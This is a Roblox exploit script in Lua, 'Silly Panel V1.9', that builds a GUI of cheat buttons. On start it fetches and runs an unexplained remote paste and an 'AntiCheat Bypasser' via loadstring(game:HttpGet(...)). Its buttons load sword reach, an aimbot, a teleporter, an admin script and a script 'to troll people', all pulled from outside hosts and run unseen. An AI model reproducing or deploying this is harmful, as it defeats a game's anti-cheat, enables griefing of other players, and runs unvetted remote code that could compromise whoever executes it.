--// credit to IceMinisterq for the notification library
loadstring(game:HttpGet("https://pastefy.app/SsJzir8l/raw"))()
local NotificationLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/IceMinisterq/Notification-Library/Main/Library.lua"))()
NotificationLibrary:SendNotification("Info", "Silly Panel made by https :p *bleh*~", 10)

local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local gui = Instance.new("ScreenGui", gethui())
gui.ResetOnSpawn = false

local imageLabel = Instance.new("ImageLabel", gui)
imageLabel.Size = UDim2.new(0, 400, 0, 200)
imageLabel.AnchorPoint = Vector2.new(0.5, 0.5)
imageLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
imageLabel.Image = "rbxassetid://10245993691"
imageLabel.BackgroundTransparency = 1

local border = Instance.new("UIStroke", imageLabel)
border.Color = Color3.new(0, 0, 0)
border.Thickness = 2

Instance.new("UIDragDetector", imageLabel)

local uiScale = Instance.new("UIScale", imageLabel)
uiScale.Scale = 1 --// Change this to easily change everything size

local title = Instance.new("TextLabel", imageLabel)
title.Size = UDim2.new(1, -35, 0, 40)
title.Position = UDim2.new(0, 10, 0, 0)
title.BackgroundTransparency = 1
title.Text = "Silly Panel [V1.9]"
title.TextColor3 = Color3.new(0, 0, 0)
title.Font = Enum.Font.GothamBold
title.TextSize = 18
title.TextXAlignment = Enum.TextXAlignment.Left

local scrollFrame = Instance.new("ScrollingFrame", imageLabel)
scrollFrame.Size = UDim2.new(1, -19,1, -50)
scrollFrame.Position = UDim2.new(0, 10, 0, 40)
scrollFrame.BackgroundTransparency = 1
scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
scrollFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
scrollFrame.ScrollBarThickness = 12
scrollFrame.ScrollBarImageColor3 = Color3.fromRGB(150, 150, 150)
scrollFrame.ScrollBarImageTransparency = 1
scrollFrame.ScrollingDirection = Enum.ScrollingDirection.Y

local hoverSound = Instance.new("Sound")
hoverSound.SoundId = "rbxassetid://4601634822"
hoverSound.Volume = 1
hoverSound.Parent = imageLabel

local clickSound = Instance.new("Sound")
clickSound.SoundId = "rbxassetid://4601635211"
clickSound.Volume = 1
clickSound.Parent = imageLabel
clickSound:Play()
--// loads AntiCheat-bypasser
loadstring(game:HttpGet("https://raw.githubusercontent.com/Roblox-HttpSpy/Random-Silly-stuff/refs/heads/main/UW2-AnticheatBypasser.lua"))()
NotificationLibrary:SendNotification("Info", "[V1.9] AntiCheat Bypasser Activated, join our Discord btw :3 (pls)", 10)
--// function to easily create new buttons
local xOffset = 0
local yOffset = 0
local buttonCount = 0

local function createButton(name)
	local btn = Instance.new("TextButton", scrollFrame)
	btn.Name = name
	btn.Size = UDim2.new(0, 170, 0, 50)
	btn.Position = UDim2.new(0, 10 + xOffset, 0, yOffset)
	btn.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
	btn.BackgroundTransparency = 0.6
	btn.TextColor3 = Color3.new(1,1,1)
	btn.TextWrapped = true
	btn.Text = name
	btn.BorderSizePixel = 0
	btn.AutoButtonColor = false

	xOffset = xOffset + 180
	buttonCount = buttonCount + 1

	if buttonCount % 2 == 0 then
		xOffset = 0
		yOffset = yOffset + 60
	end

	scrollFrame.CanvasSize = UDim2.new(0, 0, 0, yOffset + 60)

	local normalSize = btn.Size
	local hoverSize = UDim2.new(0, 180, 0, 55)
	local clickSize = UDim2.new(0, 160, 0, 45)
--// small ui details
	local function tweenSize(targetSize, time)
		TweenService:Create(btn, TweenInfo.new(time, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = targetSize}):Play()
	end

	local hovering = false
	btn.MouseEnter:Connect(function()
		hovering = true
		hoverSound:Play()
		tweenSize(hoverSize, 0.15)
	end)
	btn.MouseLeave:Connect(function()
		hovering = false
		tweenSize(normalSize, 0.15)
	end)
	btn.TouchTap:Connect(function()
		if not hovering then
			hoverSound:Play()
			tweenSize(hoverSize, 0.15)
			task.delay(0.2, function()
				if not hovering then tweenSize(normalSize, 0.15) end
			end)
		end
	end)
	btn.MouseButton1Click:Connect(function()
		clickSound:Play()
		tweenSize(clickSize, 0.05)
		task.delay(0.05, function()
			tweenSize(hovering and hoverSize or normalSize, 0.1)
		end)
	end)

	return btn
end

local closeButton = Instance.new("TextButton", imageLabel)
closeButton.Size = UDim2.new(0, 25, 0, 25)
closeButton.Position = UDim2.new(1, -30, 0, 7)
closeButton.BackgroundTransparency = 1
closeButton.TextColor3 = Color3.new(0, 0, 0)
closeButton.Text = "X"
closeButton.Font = Enum.Font.SourceSansBold
closeButton.TextSize = 18
closeButton.BorderSizePixel = 0

local lastPosition = imageLabel.Position

local minimizedButton = Instance.new("ImageButton", gui)
minimizedButton.Image = "rbxassetid://10245993691"
minimizedButton.Size = UDim2.new(0, 40, 0, 40)
minimizedButton.Position = UDim2.new(0.5, -30, 0.5, -30)
minimizedButton.Visible = false
minimizedButton.BackgroundTransparency = 1

local lastMinimizedPosition = minimizedButton.Position

local stroke = Instance.new("UIStroke", minimizedButton)
stroke.Color = Color3.new(0, 0, 0)
stroke.Thickness = 2

local uicorner = Instance.new("UICorner", minimizedButton)
uicorner.CornerRadius = UDim.new(1, 0)

local draggingMin = false
local dragStartMin, startPosMin
--// i had to make a custom drag function for the lil circle when the script is minimized, UIDragDetector wont work
minimizedButton.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		draggingMin = true
		dragStartMin = input.Position
		startPosMin = minimizedButton.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				draggingMin = false
			end
		end)
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if draggingMin and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
		local delta = input.Position - dragStartMin
		local newPos = UDim2.new(startPosMin.X.Scale, startPosMin.X.Offset + delta.X, startPosMin.Y.Scale, startPosMin.Y.Offset + delta.Y)
		minimizedButton.Position = newPos
		lastMinimizedPosition = newPos
	end
end)

closeButton.MouseButton1Click:Connect(function()
	lastPosition = imageLabel.Position
	imageLabel.Visible = false
	minimizedButton.Position = lastMinimizedPosition
	minimizedButton.Visible = true
	clickSound:Play()
end)

minimizedButton.MouseButton1Click:Connect(function()
	imageLabel.Position = lastPosition
	imageLabel.Visible = true
	minimizedButton.Visible = false
	clickSound:Play()
end)
--// feel free to create new buttons
local btn1 = createButton("AntiCheat Bypasser its already running in the background")
local btn2 = createButton("OP Sword Reach V3")
local btn3 = createButton("Nameless-Admin (Better then IY)")
local btn4 = createButton("OPFinality, just a script you can use to troll poeple lol [Recommend to use AntiCheat Bypasser]")
local btn5 = createButton("Teleporter (May or May not work, Atleast go UnderGround)")
local btn6 = createButton("Delete All Dirt (Client-Sided)")
local btn7 = createButton("Join Our Discord :3")
local btn8 = createButton("Sniper AimBot V2 [Click On Options after execution] ")
--// and add function to said buttons
btn1.MouseButton1Click:Connect(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Roblox-HttpSpy/Random-Silly-stuff/refs/heads/main/UW2-AnticheatBypasser.lua"))() end)
btn2.MouseButton1Click:Connect(function() loadstring(game:HttpGet("https://pastefy.app/yhVOHzjp/raw"))() end) -- old version (V2) https://pastefy.app/unXq4J5u/raw
btn3.MouseButton1Click:Connect(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/Source.lua"))() end)
btn4.MouseButton1Click:Connect(function() loadstring(game:HttpGet("https://rawscripts.net/raw/OpFinality_590"))() end)
btn5.MouseButton1Click:Connect(function() loadstring(game:HttpGet("https://pastefy.app/83YCFeyG/raw"))() end)
btn6.MouseButton1Click:Connect(function() if workspace:FindFirstChild("Dirts") then workspace.Dirts:Destroy() else NotificationLibrary:SendNotification("Info", "Already Deleted it lil bro", 4) end end)
btn7.MouseButton1Click:Connect(function() setclipboard("https://discord.gg/JgguB4fHmf") end)
btn8.MouseButton1Click:Connect(function() loadstring(game:HttpGet("https://pastefy.app/TXAILVzD/raw"))() end)
